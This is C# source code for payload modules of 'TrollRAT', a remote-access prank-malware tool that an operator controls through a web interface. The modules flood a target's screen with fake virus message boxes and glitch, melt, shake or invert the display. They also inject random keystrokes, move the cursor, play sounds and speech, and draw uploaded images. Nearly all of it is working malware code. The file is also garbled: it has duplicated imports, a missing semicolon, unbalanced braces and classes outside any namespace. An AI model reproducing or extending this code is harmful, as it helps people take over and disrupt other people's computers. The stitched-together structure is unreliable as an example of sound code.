using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Windows.Forms;
using TrollRAT.Payloads;
using TrollRAT.Server.Commands;
using TrollRATPayloads.Actions;
using System.ComponentModel.Composition;
using System.IO;
using System.Reflection;
using System.Text;
using TrollRAT.Utils;
using TrollRAT.Payloads;
using TrollRATPayloads.Actions;
using Flufuyy.Maware.Payloads

namespace TrollRATPayloads.Payloads
{
    public class PayloadMessageBox : LoopingPayload
    {
        [DllImport("TrollRATNative.dll", CharSet = CharSet.Auto)]
        public static extern void payloadMessageBox(string text, string label, int style, int mode);

        protected PayloadSettingSelect mode = new PayloadSettingSelect(0, "Mode",
            new string[] { "Fixed Text", "Random Error Messages" });

        protected PayloadSettingString text = new PayloadSettingString("your computer is a trash", "Message Box Text");
        protected PayloadSettingString label = new PayloadSettingString("l´am a virus, LOL", "Window Title");

        protected PayloadSettingSelect icon = new PayloadSettingSelect(3, "Message Box Icon",
            new string[] {"None", "Error", "Question", "Warning", "Information", "Random"});

        public PayloadMessageBox()
        {
            name = "Message Boxes";

            settings.Add(mode);

            settings.Add(text);
            settings.Add(label);

            settings.Add(icon);

            actions.Add(new PayloadActionClearWindows(this));
        }

        protected override void execute()
        {
            new Thread(new ThreadStart(messageBoxThread)).Start();
        }

        private void messageBoxThread()
        {
            int i = icon.Value;
            if (i == 5)
                i = new Random().Next(1, 5);

            payloadMessageBox(text.Value, label.Value, 0x1000 | (i << 4), mode.Value);
        }
    }

    public class PayloadGlitch : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadGlitch(int maxSize, int power);

        protected PayloadSettingNumber maxSize = new PayloadSettingNumber(500, "Maximum Rectangle Size", 20, 1000, 1);
        protected PayloadSettingNumber power = new PayloadSettingNumber(2, "Glitch Power", 1, 40, 1);

        public PayloadGlitch() : base(20)
        {
            actions.Add(new PayloadActionClearScreen(this));

            settings.Add(maxSize);
            settings.Add(power);

            name = "Screen Glitches";
        }

        protected override void execute()
        {
            payloadGlitch((int)maxSize.Value, (int)power.Value);
        }
    }

    public class PayloadSound : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadSound(int sound);

        protected PayloadSettingSelect sound = new PayloadSettingSelect(6, "Sound Type",
            new string[] { "Error", "Warning", "Information", "Question", "Startup", "Shutdown", "Random" });

        public PayloadSound() : base(30)
        {
            settings.Add(sound);

            name = "Play System Sounds";
        }

        protected override void execute()
        {
            int i = sound.Value;
            if (i == 6)
                i = new Random().Next(0, 4);

            payloadSound(i);
        }
    }

    public class PayloadKeyboard : LoopingPayload
    {
        public PayloadKeyboard() : base(20) { name = "Random Keyboard Input"; }

        protected override void execute()
        {
            SendKeys.SendWait(((Char)new Random().Next('a', 'z'+1)).ToString());
        }
    }

    public class PayloadTunnel : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadTunnel(int scale);

        protected PayloadSettingNumber scale = new PayloadSettingNumber(50, "Scale factor per iteration", 1, 400, 1);

        public PayloadTunnel() : base(20)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(scale);

            name = "Tunnel Effect";
        }

        protected override void execute()
        {
            payloadTunnel((int)scale.Value);
        }
    }

    public class PayloadReverseText : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadReverseText();

        public PayloadReverseText() { name = "Reverse Text"; }

        protected override void execute()
        {
            payloadReverseText();
        }
    }

    public class PayloadDrawErrors : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadDrawErrors(int count, int chance);

        protected PayloadSettingNumber errorCount = new PayloadSettingNumber(2, "Error Count", 1, 40, 1);
        protected PayloadSettingNumber errorChance = new PayloadSettingNumber(20, "Error Chance (in %)", 0, 100, 1);

        public PayloadDrawErrors() : base(2)
        {
            actions.Add(new PayloadActionClearScreen(this));

            settings.Add(errorCount);
            settings.Add(errorChance);

            name = "Draw Errors";
        }

        protected override void execute()
        {
            payloadDrawErrors((int)errorCount.Value, (int)errorChance.Value);
        }
    }

    public class PayloadInvertScreen : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadInvertScreen();

        public PayloadInvertScreen()
        {
            actions.Add(new PayloadActionClearScreen(this));
            name = "Invert Screen";
        }

        protected override void execute()
        {
            payloadInvertScreen();
        }
    }

    public class PayloadCursor : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadCursor(int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(4, "Movement Factor", 2, 100, 1);

        public PayloadCursor() : base(2)
        {
            name = "Move Cursor";
            settings.Add(power);
        }

        protected override void execute()
        {
            payloadCursor((int)power.Value);
        }
    }
}

public class PayloadEarthquake : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadEarthquake(int delay, int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(20, "Movement Factor", 2, 60, 1);

        public PayloadEarthquake() : base(4)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(power);

            name = "Earthquake (Shake Screen)";
        }

        protected override void execute()
        {
            payloadEarthquake((int)Delay, (int)power.Value);
        }
    }

    public class PayloadMeltingScreen : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadMeltingScreen(int xSize, int ySize, int power, int distance);

        private PayloadSettingNumber xSize = new PayloadSettingNumber(30, "X Size", 1, 200, 1);
        private PayloadSettingNumber ySize = new PayloadSettingNumber(8, "Y Size", 1, 200, 1);
        private PayloadSettingNumber power = new PayloadSettingNumber(10, "Power", 1, 40, 1);
        private PayloadSettingNumber distance = new PayloadSettingNumber(1, "Distance between bars", 1, 500, 1);

        public PayloadMeltingScreen() : base(4)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(xSize);
            settings.Add(ySize);
            settings.Add(distance);
            settings.Add(power);

            name = "Melting Screen";
        }

        protected override void execute()
        {
            payloadMeltingScreen((int)xSize.Value, (int)ySize.Value, (int)power.Value, (int)distance.Value);
        }
    }

    public class PayloadTrain : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadTrain(int xPower, int yPower);

        private PayloadSettingNumber xPower = new PayloadSettingNumber(10, "X Movement", -100, 100, 1);
        private PayloadSettingNumber yPower = new PayloadSettingNumber(0, "Y Movement", -100, 100, 1);

        public PayloadTrain() : base(5)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(xPower);
            settings.Add(yPower);

            name = "Train/Elevator Effect";
        }

        protected override void execute()
        {
            payloadTrain((int)xPower.Value, (int)yPower.Value);
        }
    }

    public class PayloadDrawPixels : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadDrawPixels(uint color, int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(500, "Changed Pixels per Iteration", 1, 10000, 1);
        protected PayloadSettingSelect color = new PayloadSettingSelect(0, "Color",
            new string[] { "Black", "White", "Red", "Green", "Blue", "Random (Black/White)", "Random (RGB)" });

        private static readonly uint[] colors = new uint[] { 0x000000, 0xFFFFFF, 0x0000FF, 0x00FF00, 0xFF0000 };

        private Random rng = new Random();

        public PayloadDrawPixels() : base(1)
        {
            actions.Add(new PayloadActionClearScreen(this));

            settings.Add(power);
            settings.Add(color);

            name = "Draw Pixels on Screen";
        }

        protected override void execute()
        {
            uint c;

            if (color.Value == colors.Length)
                c = rng.NextDouble() > 0.5 ? colors[0] : colors[1];
            else if (color.Value == colors.Length + 1)
                c = (uint)rng.Next();
            else
                c = colors[color.Value];

            payloadDrawPixels(c, (int)power.Value);
        }
    }

    public class PayloadTTS : ExecutablePayload
    {
        protected class PayloadSettingVoice : PayloadSettingSelectBase
        {
            public InstalledVoice SelectedVoice => synth.GetInstalledVoices()[value];

            public PayloadSettingVoice(string title) : base(0, title) { }

            public override string[] Options
            {
                get
                {
                    return (from voice in synth.GetInstalledVoices()
                            select voice.VoiceInfo.Name).ToArray();
                }
                set { throw new NotImplementedException(); }
            }
        }

        protected class PayloadActionStop : SimplePayloadAction
        {
            public PayloadActionStop(Payload payload) : base(payload) { }

            public override string Icon => null;
            public override string Title => "Stop Speaking";

            public override string execute()
            {
                synth.SpeakAsyncCancelAll();
                return "void(0);";
            }
        }

        private PayloadSettingString message = new PayloadSettingString(
            "soi soi soi soi soi soi soi soi soi soi soi", "Message to speak");

        private PayloadSettingNumber rate = new PayloadSettingNumber(1, "Speed Rate", -10, 10, 1);
        private PayloadSettingNumber volume = new PayloadSettingNumber(100, "Volume", 0, 100, 1);

        private PayloadSettingVoice voice = new PayloadSettingVoice("TTS Voice");

        protected static SpeechSynthesizer synth = new SpeechSynthesizer();

        public PayloadTTS()
        {
            settings.Add(message);
            settings.Add(voice);
            settings.Add(volume);
            settings.Add(rate);

            actions.Add(new PayloadActionStop(this));

            synth.SetOutputToDefaultAudioDevice();

            name = "Play TTS Voice";
        }

        protected override void execute()
        {
            synth.Rate = (int)rate.Value;
            synth.Volume = (int)volume.Value;

            synth.SelectVoice(voice.SelectedVoice.VoiceInfo.Name);

            try
            {
                synth.Speak(message.Value);
            }
            catch (Exception) { }
        }
    }

    public class PayloadDrawImages : LoopingPayload
    {
        private PayloadSettingNumber scaleFactor = new PayloadSettingNumber(100, "Scale Factor (in %)", 1, 100, 1);
        private PayloadSettingSelectFile fileName = new PayloadSettingSelectFile(
            0, "Uploaded File Name", UploadCommand.uploadDir);
        private PayloadSettingSelect mode = new PayloadSettingSelect(0, "Mode",
            new string[] { "Draw Image to Screen directly", "Overlay Image on Screen" });

        private Random rng = new Random();

        private Bitmap image;
        private Graphics drawingArea;

        internal void imageChanged<t>(object sender, t selectedFile)
        {
            try
            {
                if (image != null)
                {
                    image.Dispose();
                    image = null;
                }

                using (Bitmap newImage = new Bitmap(fileName.selectedFilePath))
                {
                    image = new Bitmap(newImage, new Size((int)(newImage.Width * (scaleFactor.Value / 100)),
                        (int)(newImage.Height * (scaleFactor.Value / 100))));
                }
            } catch (Exception) { }
        }

        internal void modeChanged(object sender, int value)
        {
            switch (value)
            {
                case 0:
                    drawingArea = OverlayWindow.ScreenGraphics;
                    break;
                case 1:
                    drawingArea = OverlayWindow.OverlayGrahpics;
                    break;
            }
        }

        public PayloadDrawImages() : base(10)
        {
            settings.Add(fileName);
            settings.Add(scaleFactor);
            settings.Add(mode);

            actions.Add(new PayloadActionClearScreen(this));

            imageChanged(null, 0);
            modeChanged(null, 0);

            scaleFactor.SettingChanged += new PayloadSettingNumber.PayloadSettingChangeEvent(imageChanged);
            fileName.SettingChanged += new PayloadSettingSelectFile.PayloadSettingChangeEvent(imageChanged);
            mode.SettingChanged += new PayloadSettingSelect.PayloadSettingChangeEvent(modeChanged);

            name = "Draw Uploaded Images";
        }

        protected override void execute()
        {
            if (image != null && drawingArea != null)
            {
                switch (mode.Value)
                {
                    case 0:
                    case 1:
                        int x = rng.Next(0, Screen.PrimaryScreen.Bounds.Width - image.Width);
                        int y = rng.Next(0, Screen.PrimaryScreen.Bounds.Height - image.Height);

                        try
                        {
                            drawingArea.DrawImageUnscaled(image, x, y);
                        }
                        catch (Exception) { }
                        

                        break;
                }

                if (mode.Value > 0)
                    OverlayWindow.updateOverlay();
            }
        }
    }
}

public static class OverlayWindow
    {
        [DllImport("TrollRATNative.dll")]
        public static extern IntPtr getOverlayDC();

        [DllImport("TrollRATNative.dll")]
        public static extern void updateOverlay();

        [DllImport("TrollRATNative.dll")]
        public static extern void initOverlay();

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        public static readonly Graphics OverlayGrahpics;
        public static readonly Graphics ScreenGraphics = Graphics.FromHwndInternal(GetDesktopWindow());

        static OverlayWindow()
        {
            initOverlay();

            while (getOverlayDC() == IntPtr.Zero) { }
            Thread.Sleep(1000); // idk why I have to do this

            OverlayGrahpics = Graphics.FromHdc(getOverlayDC());
        }
    }


public abstract class Payload
    {
        protected string name;
        public string Name => name;

        protected List<PayloadSetting> settings = new List<PayloadSetting>();
        public List<PayloadSetting> Settings => settings;

        protected List<PayloadAction> actions = new List<PayloadAction>();
        public List<PayloadAction> Actions => actions;

        public virtual void writeToStream(BinaryWriter writer)
        {
            foreach (PayloadSetting setting in settings)
            {
                setting.writeToStream(writer);
            }
        }

        public virtual void readFromStream(BinaryReader reader)
        {
            foreach (PayloadSetting setting in settings)
            {
                setting.readFromStream(reader);
            }
        }
    }

    public abstract class ExecutablePayload : Payload
    {
        protected abstract void execute();

        public ExecutablePayload()
        {
            actions.Add(new PayloadActionExecute(this));
        }

        public void Execute()
        {
            var thread = new Thread(new ThreadStart(execute));
            thread.Start();
        }
    }

    public abstract class LoopingPayload : ExecutablePayload
    {
        public static bool pausePayloads = false;

        protected bool running = false;
        public bool Running => running;

        private PayloadSettingNumber delay;
        public decimal Delay => delay.Value;

        protected int i;

        public LoopingPayload(int defaultDelay)
        {
            delay = new PayloadSettingNumber(defaultDelay, "Delay (in 1/100 seconds)", 1, 10000, 1);

            settings.Add(delay);
            actions.Add(new PayloadActionStartStop(this));

            var thread = new Thread(new ThreadStart(Loop));
            thread.Start();
        }

        public LoopingPayload() : this(100) { }

        public void Start()
        {
            running = true;
            i = 0;
        }

        public void Stop()
        {
            running = false;
        }

        private void Loop()
        {
            while (true)
            {
                if (running && !pausePayloads)
                {
                    execute();
                }

                for (i = (int)Delay; i >= 0; i--)
                    Thread.Sleep(10);
            }
        }

        public override void writeToStream(BinaryWriter writer)
        {
            base.writeToStream(writer);
            writer.Write(running);
        }

        public override void readFromStream(BinaryReader reader)
        {
            base.readFromStream(reader);
            running = reader.ReadBoolean();
        }
    }
    
public abstract class PayloadAction : IDBase<PayloadAction>
    {
        protected Payload payload;
        public Payload Payload => payload;

        public PayloadAction(Payload payload)
        {
            this.payload = payload;
        }

        public abstract string getListButton();
        public abstract string getSettingsButton();

        // Returns JavaScript to be executed by the client
        public abstract string execute();

        // Returns the JavaScript that should be used for the button
        // in order to trigger its server routine
        public virtual string getExecuteJavascript()
        {
            return String.Format("execute({0});", id);
        }
    }

    public abstract class SimplePayloadAction : PayloadAction
    {
        public SimplePayloadAction(Payload payload) : base(payload) { }

        public abstract string Title { get; }
        public abstract string Icon { get; }
        public virtual string Color => "default";

        public override string getListButton()
        {
            if (Icon == null)
                return null;

            return String.Format("<span onclick=\"{0}\" class=\"btn btn-{2} btn-xs\">" +
                "<span class=\"glyphicon glyphicon-{1}\" aria-hidden=\"true\"></span></span> ",
                getExecuteJavascript(), Icon, Color);
        }

        public override string getSettingsButton()
        {
            return String.Format("<button type=\"button\" onclick=\"{0}\" class=\"btn btn-{2} btn-xl\">" +
               "{1}</button> ", getExecuteJavascript(), Title, Color);
        }
    }

    public abstract class DangerousPayloadAction : SimplePayloadAction
    {
        public DangerousPayloadAction(Payload payload) : base(payload) { }

        // TODO Proper Escaping
        public abstract string WarningMessage { get; }

        public override string Color => "danger";

        public override string getExecuteJavascript()
        {
            return String.Format("showYesNo('{0}', '{2}', '{1}');", WarningMessage, base.getExecuteJavascript(), Title);
        }
    }

    public class PayloadActionExecute : SimplePayloadAction
    {
        public override string Title => "Execute";
        public override string Icon => "cog";

        public PayloadActionExecute(Payload payload) : base(payload) { }

        public override string execute()
        {
            if (payload is ExecutablePayload)
            {
                ExecutablePayload pl = ((ExecutablePayload)payload);
                pl.Execute();
            }
            else
            {
                throw new ArgumentException("Payload is not an ExecutablePayload");
            }

            return "void(0);";
        }
    }

    public class PayloadActionStartStop : SimplePayloadAction
    {
        LoopingPayload pl;
        public PayloadActionStartStop(Payload payload) : base(payload)
        {
            if (payload is LoopingPayload)
                pl = ((LoopingPayload)payload);
            else
                throw new ArgumentException("Payload is not a LoopingPayload");
        }

        public override string execute()
        {
            if (pl.Running)
                pl.Stop();
            else
                pl.Start();

            return "update();";
        }
        
        public override string Icon => pl.Running ? "stop" : "play";
        public override string Title => pl.Running ? "Stop" : "Start";
    }
    
{
    public abstract class PayloadSetting : IDBase<PayloadSetting>
    {
        public abstract void writeHTML(StringBuilder builder);
        public abstract void readData(string str);

        public virtual void writeToStream(BinaryWriter writer)
        {
            //writer.Write(id);
        }

        public virtual void readFromStream(BinaryReader reader)
        {
            //id = reader.ReadInt32();
        }
    }

    public abstract class PayloadSetting<t> : PayloadSetting
    {
        public delegate void PayloadSettingChangeEvent(object sender, t newValue);
        public event PayloadSettingChangeEvent SettingChanged;

        protected t value;
        public t Value
        {
            get { return value; }
            set
            {
                if (isValid(value))
                {
                    this.value = value;
                    SettingChanged(this, value);
                }
            }
        }

        public PayloadSetting(t defaultValue) : base()
        {
            value = defaultValue;
        }

        public virtual bool isValid(t v)
        {
            return true;
        }

        public virtual void writeValueToStream(BinaryWriter writer)
        {
            foreach (MethodInfo method in writer.GetType().GetMethods())
            {
                if (method.Name == "Write" && method.GetParameters()[0].ParameterType == typeof(t))
                {
                    method.Invoke(writer, new object[] { value });
                    return;
                }
            }

            throw new NotImplementedException("The value type is not suported by BinaryWriter. Please override the writeValueToStream method.");
        }

        public virtual void readValueFromStream(BinaryReader reader)
        {
            foreach (MethodInfo method in reader.GetType().GetMethods())
            {
                if (method.Name.StartsWith("Read") && method.Name != "Read" && method.ReturnType == typeof(t))
                {
                    Value = (t)method.Invoke(reader, new object[0]);
                    return;
                }
            }

            throw new NotImplementedException("The value type is not suported by BinaryReader. Please override the readValueFromStream method.");
        }

        public override void writeToStream(BinaryWriter writer)
        {
            base.writeToStream(writer);
            writeValueToStream(writer);
        }

        public override void readFromStream(BinaryReader reader)
        {
            base.readFromStream(reader);
            readValueFromStream(reader);
        }
    }

    public abstract class TitledPayloadSetting<t> : PayloadSetting<t>
    {
        protected string title;
        public string Title => title;

        public TitledPayloadSetting(t defaultValue, string title) : base(defaultValue)
        {
            this.title = title;
        }
    }

    public class PayloadSettingNumber : TitledPayloadSetting<decimal>
    {
        protected decimal min, max, step;
        public decimal Min => min;
        public decimal Max => max;
        public decimal Step => step;

        public PayloadSettingNumber(decimal defaultValue, string title, decimal min, decimal max, decimal step) : base(defaultValue, title)
        {
            this.min = min;
            this.max = max;
            this.step = step;
        }

        public override void writeHTML(StringBuilder builder)
        {
            builder.Append(String.Format("<div class=\"form-group\"><label for=\"id{5}\">{0}</label><input id=\"id{5}\" " +
                "class=\"form-control\" type=\"number\"min=\"{1}\" max=\"{2}\" step=\"{3}\" value=\"{4}\" " +
                "oninput=\"setSetting({5}, this.value);\"></input></div>",
                title, min, max, step, value, id));
        }

        public override void readData(string str)
        {
            try
            {
                decimal i = decimal.Parse(str);
                Value = i;
            }
            catch (Exception) { }
        }

        public override bool isValid(decimal v)
        {
            return (v <= max && v >= min);
        }
    }

    public class PayloadSettingString : TitledPayloadSetting<string>
    {
        public PayloadSettingString(string defaultValue, string title) : base(defaultValue, title) { }

        public override void writeHTML(StringBuilder builder)
        {
            builder.Append(String.Format("<div class=\"form-group\"><label for=\"id{1}\">{0}</label><input id=\"id{1}\" " +
                "class=\"form-control\" type=\"text\" value=\"{2}\" " +
                "oninput=\"setSetting({1}, this.value);\"></input></div>",
                title, id, value));
        }

        public override void readData(string str)
        {
            value = str;
        }
    }

    public abstract class PayloadSettingSelectBase : TitledPayloadSetting<int>
    {
        public abstract string[] Options { get; set; }
        public string ValueText => Options[value];

        public PayloadSettingSelectBase(int defaultValue, string title) : base(defaultValue, title) { }

        public override void writeHTML(StringBuilder builder)
        {
            builder.Append(String.Format("<div class=\"form-group\"><label for=\"id{1}\">{0}</label><select id=\"id{1}\" " +
                "class=\"form-control\" onchange=\"setSetting({1}, this.selectedIndex);\">",
                title, id, value));

            string[] options = Options;
            for (int i = 0; i < options.Length; i++)
            {
                builder.Append((i == value ? "<option selected=\"selected\">" : "<option>") + options[i] + "</option>");
            }

            builder.Append("</select></div>");
        }

        public override void readData(string str)
        {
            try
            {
                int i = int.Parse(str);
                Value = i;
            }
            catch (Exception) { }
        }

        public override bool isValid(int v)
        {
            return (v >= 0 && v < Options.Length);
        }
    }

    public class PayloadSettingSelect : PayloadSettingSelectBase
    {
        protected string[] options;

        public override string[] Options
        {
            get { return options; }
            set { options = value; }
        }

        public PayloadSettingSelect(int defaultValue, string title, string[] options) : base(defaultValue, title)
        {
            this.options = options;
        }
    }

    public class PayloadSettingSelectFile : PayloadSettingSelectBase
    {
        protected string pattern, baseDirectory;

        public PayloadSettingSelectFile(int defaultValue, string title, string baseDirectory, string pattern = null) : base(defaultValue, title)
        {
            this.pattern = pattern;
            this.baseDirectory = baseDirectory;
        }

        public override string[] Options
        {
            get
            {
                try
                {
                    if (pattern == null)
                        return Directory.GetFiles(baseDirectory);
                    else
                        return Directory.GetFiles(baseDirectory, pattern);
                } catch (Exception) {
                    return new string[0];
                }
            }
            set { throw new NotSupportedException(); }
        }

        public string selectedFilePath => Path.Combine(baseDirectory, ValueText);
    }
    
    
